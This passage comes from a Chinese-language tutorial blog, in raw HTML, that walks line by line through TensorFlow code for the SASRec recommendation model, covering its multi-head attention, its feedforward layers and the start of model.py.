class=\"literal\">False</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        scope=<span class=\"string\">&quot;multihead_attention&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">                        reuse=<span class=\"literal\">None</span>,</span></span><br><span class=\"line\"><span class=\"params\">                        with_qk=<span class=\"literal\">False</span></span>):</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>queries</code> : 查询张量。</li>\n<li><code>keys</code> : 键张量。</li>\n<li><code>num_units</code> : 注意力机制的维度，默认为  <code>None</code> 。</li>\n<li><code>num_heads</code> : 注意力头的数量，默认为  <code>8</code> 。</li>\n<li><code>dropout_rate</code> : Dropout 的概率，默认为  <code>0</code> 。</li>\n<li><code>is_training</code> : 是否在训练模式，默认为  <code>True</code> 。</li>\n<li><code>causality</code> : 是否应用因果掩码，默认为  <code>False</code> 。</li>\n<li><code>scope</code> : 变量作用域的名称，默认为  <code>&quot;multihead_attention&quot;</code> 。</li>\n<li><code>reuse</code> : 是否重用变量，默认为  <code>None</code> 。</li>\n<li><code>with_qk</code> : 是否返回  <code>Q</code>  和  <code>K</code>  矩阵，默认为  <code>False</code> 。</li>\n</ul>\n<h4 id=\"变量作用域设置num_units\"><a class=\"anchor\" href=\"#变量作用域设置num_units\">#</a> 变量作用域，设置 <code>num_units</code></h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>如果  <code>num_units</code>  为  <code>None</code> ，则将其设置为查询张量的最后一个维度。</li>\n</ul>\n<h4 id=\"线性变换\"><a class=\"anchor\" href=\"#线性变换\">#</a> 线性变换</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Q = tf.layers.dense(queries, num_units, activation=<span class=\"literal\">None</span>)</span><br><span class=\"line\">K = tf.layers.dense(keys, num_units, activation=<span class=\"literal\">None</span>)</span><br><span class=\"line\">V = tf.layers.dense(keys, num_units, activation=<span class=\"literal\">None</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>对  <code>queries</code> 、 <code>keys</code>  和  <code>values</code>  进行线性变换，得到  <code>Q</code> 、 <code>K</code>  和  <code>V</code>  矩阵。</li>\n</ul>\n<h4 id=\"拆分和拼接\"><a class=\"anchor\" href=\"#拆分和拼接\">#</a> 拆分和拼接</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Q_ = tf.concat(tf.split(Q, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">K_ = tf.concat(tf.split(K, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br><span class=\"line\">V_ = tf.concat(tf.split(V, num_heads, axis=<span class=\"number\">2</span>), axis=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure></p>\n<p><strong> <code>tf.split(Q, num_heads, axis=2)</code> </strong>：</p>\n<ul>\n<li>将  <code>Q</code>  矩阵沿着  <code>axis=2</code>  维度切分成  <code>num_heads</code>  个子矩阵。</li>\n<li>假设  <code>Q</code>  的形状为  <code>[batch_size, sequence_length, num_units]</code> ，那么切分后的每个子矩阵的形状为  <code>[batch_size, sequence_length, num_units / num_heads]</code> 。</li>\n</ul>\n<p><strong> <code>tf.concat(..., axis=0)</code> </strong>：</p>\n<ul>\n<li>将上述切分得到的子矩阵在  <code>axis=0</code>  维度上拼接起来。</li>\n<li>假设有  <code>num_heads</code>  个子矩阵，每个子矩阵的形状为  <code>[batch_size, sequence_length, num_units / num_heads]</code> ，那么拼接后的矩阵形状为  <code>[batch_size * num_heads, sequence_length, num_units / num_heads]</code> 。</li>\n</ul>\n<h4 id=\"计算注意力分数\"><a class=\"anchor\" href=\"#计算注意力分数\">#</a> 计算注意力分数</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.matmul(Q_, tf.transpose(K_, [<span class=\"number\">0</span>, <span class=\"number\">2</span>, <span class=\"number\">1</span>]))</span><br><span class=\"line\">outputs = outputs / (K_.get_shape().as_list()[-<span class=\"number\">1</span>] ** <span class=\"number\">0.5</span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>\n<p><code>Q_</code> ：形状为  <code>[batch_size * num_heads, sequence_length, num_units / num_heads]</code>  的查询矩阵。</p>\n<p><code>K_</code> ：形状为  <code>[batch_size * num_heads, sequence_length, num_units / num_heads]</code>  的键矩阵。</p>\n</li>\n<li>\n<p>首先对 <code>K_</code> 进行转置， <code>tf.transpose(K_, [0, 2, 1])</code></p>\n</li>\n<li>\n<p>然后使用 <code>matmul</code>  对矩阵进行点积</p>\n</li>\n<li>\n<p>然后缩放点积注意力 <code>K_.get_shape().as_list()[-1]</code> ：得到  <code>K_</code>  最后一个维度的大小，即  <code>num_units / num_heads</code> 。</p>\n</li>\n<li>\n<p><code>(K_.get_shape().as_list()[-1] ** 0.5)</code> ：计算其平方根。</p>\n</li>\n<li>\n<p>将  <code>outputs</code>  除以这个平方根，缩放点积的结果：</p>\n</li>\n</ul>\n<h4 id=\"检验码\"><a class=\"anchor\" href=\"#检验码\">#</a> 检验码</h4>\n<p>这段代码的目的是通过对  <code>outputs</code> （即点积注意力得分矩阵）进行掩码（masking）操作，以确保在计算注意力时，填充的位置（padding positions）不会对结果产生影响。让我们逐步分析每一行代码：</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">key_masks = tf.sign(tf.reduce_sum(tf.<span class=\"built_in\">abs</span>(keys), axis=-<span class=\"number\">1</span>))</span><br><span class=\"line\">key_masks = tf.tile(key_masks, [num_heads, <span class=\"number\">1</span>])</span><br><span class=\"line\">key_masks = tf.tile(tf.expand_dims(key_masks, <span class=\"number\">1</span>), [<span class=\"number\">1</span>, tf.shape(queries)[<span class=\"number\">1</span>], <span class=\"number\">1</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">paddings = tf.ones_like(outputs) * (-<span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span>)</span><br><span class=\"line\">outputs = tf.where(tf.equal(key_masks, <span class=\"number\">0</span>), paddings, outputs)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>\n<p><code>tf.abs(keys)</code> ：对  <code>keys</code>  的所有元素取绝对值。</p>\n</li>\n<li>\n<p><code>tf.reduce_sum(tf.abs(keys), axis=-1)</code> ：对  <code>keys</code>  的最后一个维度（即特征维度）求和，结果是一个形状为  <code>[batch_size, sequence_length]</code>  的张量。</p>\n</li>\n<li>\n<p><code>tf.sign(...)</code> ：对求和结果进行符号函数操作，非零值变为 1，零值保持为 0。这用于标记填充值（padding positions）。</p>\n</li>\n<li>\n<p><code>tf.tile(key_masks, [num_heads, 1])</code> ：复制  <code>key_masks</code> ，在第一个维度上复制  <code>num_heads</code>  次，以适应多头注意力的情况。结果形状为  <code>[batch_size * num_heads, sequence_length]</code> 。</p>\n</li>\n<li>\n<p><code>tf.expand_dims(key_masks, 1)</code> ：在  <code>key_masks</code>  的第一个维度添加一个新的维度，结果形状为  <code>[batch_size * num_heads, 1, sequence_length]</code> 。</p>\n<p><code>tf.tile(..., [1, tf.shape(queries)[1], 1])</code> ：在新添加的维度上复制  <code>tf.shape(queries)[1]</code>  次，结果形状为  <code>[batch_size * num_heads, sequence_length, sequence_length]</code> 。</p>\n</li>\n<li>\n<p><code>tf.ones_like(outputs)</code> ：创建一个与  <code>outputs</code>  形状相同的全 1 张量。</p>\n<p><code>* (-2**32 + 1)</code> ：将全 1 张量的所有值乘以一个非常小的负数（近似于负无穷），这个值将用来替换填充位置的注意力得分，使这些位置的注意力得分在 softmax 计算时接近于 0。</p>\n</li>\n<li>\n<p><code>tf.equal(key_masks, 0)</code> ：生成一个布尔张量，指示哪些位置是填充位置（ <code>key_masks</code>  为 0 的位置）。</p>\n<p><code>tf.where(...)</code> ：根据布尔张量选择对应位置的值，如果为真，则选择  <code>paddings</code>  中的值，否则选择  <code>outputs</code>  中的值。这样，填充位置的注意力得分将被设置为一个非常小的负数。</p>\n</li>\n</ul>\n<h4 id=\"因果掩码\"><a class=\"anchor\" href=\"#因果掩码\">#</a> 因果掩码</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> causality:</span><br><span class=\"line\">    diag_vals = tf.ones_like(outputs[<span class=\"number\">0</span>, :, :])</span><br><span class=\"line\">    tril = tf.linalg.LinearOperatorLowerTriangular(diag_vals).to_dense()</span><br><span class=\"line\">    masks = tf.tile(tf.expand_dims(tril, <span class=\"number\">0</span>), [tf.shape(outputs)[<span class=\"number\">0</span>], <span class=\"number\">1</span>, <span class=\"number\">1</span>])</span><br><span class=\"line\">    paddings = tf.ones_like(masks) * (-<span class=\"number\">2</span>**<span class=\"number\">32</span> + <span class=\"number\">1</span>)</span><br><span class=\"line\">    outputs = tf.where(tf.equal(masks, <span class=\"number\">0</span>), paddings, outputs)</span><br></pre></td></tr></table></figure></p>\n<p>如果  <code>causality</code>  为  <code>True</code> ，则应用因果掩码，以确保当前时间步之后的信息不会被访问。</p>\n<p>创建下三角矩阵  <code>tril</code>  作为掩码，并将无效位置的分数设置为一个非常小的值（负无穷大）。</p>\n<h4 id=\"计算注意力权重\"><a class=\"anchor\" href=\"#计算注意力权重\">#</a> 计算注意力权重</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.nn.softmax(outputs)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>对注意力分数应用 Softmax 函数，得到注意力权重。</li>\n</ul>\n<h4 id=\"查询掩码\"><a class=\"anchor\" href=\"#查询掩码\">#</a> 查询掩码</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">query_masks = tf.sign(tf.reduce_sum(tf.<span class=\"built_in\">abs</span>(queries), axis=-<span class=\"number\">1</span>))</span><br><span class=\"line\">query_masks = tf.tile(query_masks, [num_heads, <span class=\"number\">1</span>])</span><br><span class=\"line\">query_masks = tf.tile(tf.expand_dims(query_masks, -<span class=\"number\">1</span>), [<span class=\"number\">1</span>, <span class=\"number\">1</span>, tf.shape(keys)[<span class=\"number\">1</span>]])</span><br><span class=\"line\">outputs *= query_masks</span><br></pre></td></tr></table></figure></p>\n<p>计算  <code>query_masks</code> ，用于掩码无效的查询。</p>\n<p>对  <code>query_masks</code>  进行扩展和重复，使其适应多头注意力的形状。</p>\n<p>将无效位置的权重设置为零。</p>\n<h4 id=\"dropout\"><a class=\"anchor\" href=\"#dropout\">#</a> Dropout</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.layers.dropout(outputs, rate=dropout_rate, training=tf.convert_to_tensor(is_training))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>对注意力权重应用 Dropout，以防止过拟合。</li>\n</ul>\n<h4 id=\"加权求和\"><a class=\"anchor\" href=\"#加权求和\">#</a> 加权求和</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.matmul(outputs, V_)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>使用注意力权重对  <code>V</code>  进行加权求和，得到最终的输出。</li>\n</ul>\n<h4 id=\"拼接和残差连接\"><a class=\"anchor\" href=\"#拼接和残差连接\">#</a> 拼接和残差连接</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.concat(tf.split(outputs, num_heads, axis=<span class=\"number\">0</span>), axis=<span class=\"number\">2</span>)</span><br><span class=\"line\">outputs += queries</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"返回结果\"><a class=\"anchor\" href=\"#返回结果\">#</a> 返回结果</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">if</span> with_qk: <span class=\"keyword\">return</span> Q, K</span><br><span class=\"line\"><span class=\"keyword\">else</span>: <span class=\"keyword\">return</span> outputs</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"前馈神经网络-feedforward\"><a class=\"anchor\" href=\"#前馈神经网络-feedforward\">#</a> 前馈神经网络  <code>feedforward</code></h3>\n<h4 id=\"函数定义-2\"><a class=\"anchor\" href=\"#函数定义-2\">#</a> 函数定义</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">feedforward</span>(<span class=\"params\">inputs, </span></span><br><span class=\"line\"><span class=\"params\">                num_units=[<span class=\"number\">2048</span>, <span class=\"number\">512</span>],</span></span><br><span class=\"line\"><span class=\"params\">                scope=<span class=\"string\">&quot;multihead_attention&quot;</span>, </span></span><br><span class=\"line\"><span class=\"params\">                dropout_rate=<span class=\"number\">0.2</span>,</span></span><br><span class=\"line\"><span class=\"params\">                is_training=<span class=\"literal\">True</span>,</span></span><br><span class=\"line\"><span class=\"params\">                reuse=<span class=\"literal\">None</span></span>)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>inputs</code> : 输入张量。</li>\n<li><code>num_units</code> : 列表，包含两个整数，分别表示第一个和第二个卷积层的输出维度，默认为  <code>[2048, 512]</code> 。</li>\n<li><code>scope</code> : 变量作用域的名称，默认为  <code>&quot;multihead_attention&quot;</code> 。</li>\n<li><code>dropout_rate</code> : Dropout 的概率，默认为  <code>0.2</code> 。</li>\n<li><code>is_training</code> : 是否在训练模式，默认为  <code>True</code> 。</li>\n<li><code>reuse</code> : 是否重用变量，默认为  <code>None</code> 。</li>\n</ul>\n<h4 id=\"变量作用域-3\"><a class=\"anchor\" href=\"#变量作用域-3\">#</a> 变量作用域</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">with</span> tf.variable_scope(scope, reuse=reuse):</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"第一个卷积层\"><a class=\"anchor\" href=\"#第一个卷积层\">#</a> 第一个卷积层</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">params = &#123;<span class=\"string\">&quot;inputs&quot;</span>: inputs, <span class=\"string\">&quot;filters&quot;</span>: num_units[<span class=\"number\">0</span>], <span class=\"string\">&quot;kernel_size&quot;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">          <span class=\"string\">&quot;activation&quot;</span>: tf.nn.relu, <span class=\"string\">&quot;use_bias&quot;</span>: <span class=\"literal\">True</span>&#125;</span><br><span class=\"line\">outputs = tf.layers.conv1d(**params)</span><br></pre></td></tr></table></figure></p>\n<p><code>params</code> : 一个包含第一个卷积层参数的字典。</p>\n<ul>\n<li><code>inputs</code> : 输入张量。</li>\n<li><code>filters</code> : 卷积层的输出维度，为  <code>num_units[0]</code> （2048）。</li>\n<li><code>kernel_size</code> : 卷积核的大小，设置为  <code>1</code> ，相当于全连接层。</li>\n<li><code>activation</code> : 激活函数，使用 ReLU。</li>\n<li><code>use_bias</code> : 是否使用偏置，设置为  <code>True</code> 。</li>\n</ul>\n<p><code>outputs = tf.layers.conv1d(**params)</code> : 应用 1D 卷积层。</p>\n<h4 id=\"第一次dropout\"><a class=\"anchor\" href=\"#第一次dropout\">#</a> 第一次 Dropout</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.layers.dropout(outputs, rate=dropout_rate, training=tf.convert_to_tensor(is_training))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>对第一个卷积层的输出应用 Dropout，以防止过拟合。</li>\n<li><code>rate=dropout_rate</code> : Dropout 的概率。</li>\n<li><code>training=tf.convert_to_tensor(is_training)</code> : 是否在训练模式。</li>\n</ul>\n<h4 id=\"第二个卷积层\"><a class=\"anchor\" href=\"#第二个卷积层\">#</a> 第二个卷积层</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">params = &#123;<span class=\"string\">&quot;inputs&quot;</span>: outputs, <span class=\"string\">&quot;filters&quot;</span>: num_units[<span class=\"number\">1</span>], <span class=\"string\">&quot;kernel_size&quot;</span>: <span class=\"number\">1</span>,</span><br><span class=\"line\">          <span class=\"string\">&quot;activation&quot;</span>: <span class=\"literal\">None</span>, <span class=\"string\">&quot;use_bias&quot;</span>: <span class=\"literal\">True</span>&#125;</span><br><span class=\"line\">outputs = tf.layers.conv1d(**params)</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li><code>params</code> : 一个包含第二个卷积层参数的字典。\n<ul>\n<li><code>inputs</code> : 第一个卷积层的输出。</li>\n<li><code>filters</code> : 卷积层的输出维度，为  <code>num_units[1]</code> （512）。</li>\n<li><code>kernel_size</code> : 卷积核的大小，设置为  <code>1</code> ，相当于全连接层。</li>\n<li><code>activation</code> : 激活函数，设置为  <code>None</code> （线性激活）。</li>\n<li><code>use_bias</code> : 是否使用偏置，设置为  <code>True</code> 。</li>\n</ul>\n</li>\n<li><code>outputs = tf.layers.conv1d(**params)</code> : 应用第二个 1D 卷积层。</li>\n</ul>\n<h4 id=\"第二次dropout\"><a class=\"anchor\" href=\"#第二次dropout\">#</a> 第二次 Dropout</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs = tf.layers.dropout(outputs, rate=dropout_rate, training=tf.convert_to_tensor(is_training))</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>对第二个卷积层的输出应用 Dropout，以防止过拟合。</li>\n<li><code>rate=dropout_rate</code> : Dropout 的概率。</li>\n<li><code>training=tf.convert_to_tensor(is_training)</code> : 是否在训练模式。</li>\n</ul>\n<h4 id=\"残差连接\"><a class=\"anchor\" href=\"#残差连接\">#</a> 残差连接</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">outputs += inputs</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>将原始的输入张量  <code>inputs</code>  加到当前的输出张量上，进行残差连接。这有助于缓解梯度消失问题，并允许梯度在深层网络中更好地传播。</li>\n</ul>\n<h4 id=\"返回结果-2\"><a class=\"anchor\" href=\"#返回结果-2\">#</a> 返回结果</h4>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> outputs</span><br></pre></td></tr></table></figure></p>\n<ul>\n<li>返回最终的输出张量  <code>outputs</code> 。</li>\n</ul>\n<p>这个函数实现了一个两层的前馈神经网络，每层之间应用 Dropout，并使用残差连接将输入直接添加到输出。这种结构在 Transformer 模型中非常常见，用于在每个时间步上独立地应用前馈神经网络，从而增强模型的表示能力。</p>\n<p>Dropout 是一种用于防止神经网络过拟合的正则化技术。其核心思想是在每个训练步骤中随机地 “丢弃” 一部分神经元，即暂时忽略它们，并将它们的输出设置为零。这种做法强制神经网络在每次迭代中以不同的方式学习，从而降低对特定神经元或特定路径的依赖性，提高模型的泛化能力。</p>\n<h2 id=\"modelpy\"><a class=\"anchor\" href=\"#modelpy\">#</a> <span class=\"exturl\" data-url=\"aHR0cDovL21vZGVsLnB5\">model.py</span></h2>\n<p>这个代码实现了一个基于自注意力机制的推荐系统模型，主要包括以下几个部分：</p>\n<ol>\n<li><strong>初始化方法</strong>：定义各种占位符和掩码。</li>\n<li><strong>嵌入层</strong>：将输入序列嵌入到高维空间。</li>\n<li><strong>位置编码</strong>：为每个位置添加位置编码。</li>\n<li><strong>Dropout</strong>：对嵌入序列进行 dropout。</li>\n<li><strong>自注意力机制块</strong>：使用多头自注意力机制和前馈神经网络对序列进行建模。</li>\n<li><strong>归一化</strong>：对序列进行归一化处理。</li>\n<li><strong>正负样本嵌入和预测得分</strong>：计算正负样本的嵌入和预测得分。</li>\n<li><strong>损失函数</strong>：计算二元交叉熵损失和正则化损失。</li>\n<li><strong>AUC 和优化器</strong>：定义 AUC 指标和优化器。</li>\n<li><strong>预测函数</strong>：定义用于预测的函数。</li>\n</ol>\n<p>这些部分共同构建了一个推荐系统模型，</p>\n<p><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> modules <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Model</span>():</span><br><span class=\"line\">    <span class=\"keyword\">def</span> <span class=\"title function_\">__init__</span>(<span class=\"params\">self, usernum, itemnum, args, reuse=<span class=\"literal\">None</span></span>):</span><br><span class=\"line\">        self.is_training = tf.placeholder(tf.<span class=\"built_in\">bool</span>, shape=())</span><br><span class=\"line\">        self.u = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>))</span><br><span class=\"line\">        self.input_seq = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">        self.pos = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">        self.neg = tf.placeholder(tf.int32, shape=(<span class=\"literal\">None</span>, args.maxlen))</span><br><span class=\"line\">        pos = self.pos</span><br><span class=\"line\">        neg = self.neg</span><br><span class=\"line\">        mask = tf.expand_dims(tf.to_float(tf.not_equal(self.input_seq, <span class=\"number\">0</span>)), -<span class=\"number\">1</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">with</span> tf.variable_scope(<span class=\"string\">&quot;SASRec&quot;</span>, reuse=reuse):</span><br><span class=\"line\">            <span class=\"comment\"># sequence embedding, item embedding table</span></span><br><span class=\"line\">            self.seq, item_emb_table = embedding(self.input_seq,</span><br><span class=\"line\">                                                 vocab_size=itemnum + <span class=\"number\">1</span>,</span><br><span class=\"line\">                                                 num_units=args.hidden_units,</span><br><span class=\"line\">                                                 zero_pad=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                                 scale=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                                 l2_reg=args.l2_emb,</span><br><span class=\"line\">                                                 scope=<span class=\"string\">&quot;input_embeddings&quot;</span>,</span><br><span class=\"line\">                                                 with_t=<span class=\"literal\">True</span>,</span><br><span class=\"line\">                                                 reuse=reuse</span><br><span class=\"line\">                                                 )</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># Positional Encoding</span></span><br><span class=\"line\">            t, pos_emb_table = embedding(</span><br><span class=\"line\">                tf.tile(tf.expand_dims(tf.<span class=\"built_in\">range</span>(tf.shape(self.input_seq)[<span class=\"number\">1</span>]), <span class=\"number\">0</span>), [tf.shape(self.input_seq)[<span class=\"number\">0</span>], <span class=\"number\">1</span>]),</span><br><span class=\"line\">                vocab_size=args.maxlen,</span><br><span class=\"line\">                num_units=args.hidden_units,</span><br><span class=\"line\">                zero_pad=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                scale=<span class=\"literal\">False</span>,</span><br><span class=\"line\">                l2_reg=args.l2_emb,</span><br><span class=\"line\">                scope=<span class=\"string\">&quot;dec_pos&quot;</span>,</span><br><span class=\"line\">                reuse=reuse,</span><br><span class=\"line\">                with_t=<span class=\"literal\">True</span></span><br><span class=\"line\">            )</span><br><span class=\"line\">            self.seq += t</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># Dropout</span></span><br><span class=\"line\">            self.seq = tf.layers.dropout(self.seq,</span><br><span class=\"line\">                                         rate=args.dropout_rate,</span><br><span class=\"line\">                                         training=tf.convert_to_tensor(self.is_training))</span><br><span class=\"line\">            self.seq *= mask</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\"># Build blocks</span></span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(args.num_blocks):</span><br><span class=\"line\">                <span class=\"keyword\">with</span> tf.variable_scope(<span class=\"string\">&quot;num_blocks_%d&quot;</span> % i):</span><br><span class=\"line\"></span><br><span class=\"line\">                    <span class=\"comment\"># Self-attention</span></span><br><span class=\"line\">                    self.seq = multihead_attention(queries=normalize(self.seq),</span><br><span class=\"line\">                                                   keys=self.seq,</span><br><span class=\"line\">                                                   num_units=args.hidden_units,</span><br><span class=\"line\">                                                   num_heads=args.num_heads,</span><br><span class=\"line\">                                                   dropout_rate=args.dropout_rate,</span><br><span class=\"line\">                                                   is_training=self.is_training,</span><br><span class=\"line\">                                                   causality=<span 